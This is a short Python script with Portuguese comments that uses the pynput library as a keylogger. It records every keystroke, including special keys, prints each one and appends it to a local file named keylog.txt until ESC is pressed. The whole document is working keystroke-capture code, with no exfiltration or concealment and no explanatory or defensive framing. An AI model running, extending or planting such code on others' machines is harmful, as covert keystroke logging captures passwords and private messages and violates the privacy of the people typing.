import pynput
from pynput import keyboard

# Função chamada quando uma tecla é pressionada
def on_press(key):
    try:
        # Escreve a tecla pressionada no terminal
        print(f"Tecla pressionada: {key.char}")
        # Opcionalmente, você pode salvar a tecla em um arquivo
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Trata teclas especiais
        print(f"Tecla especial pressionada: {key}")
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key}]")

# Função chamada quando uma tecla é liberada
def on_release(key):
    # Interrompe o listener se a tecla ESC for pressionada
    if key == keyboard.Key.esc:
        return False

# Configura o listener do teclado
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
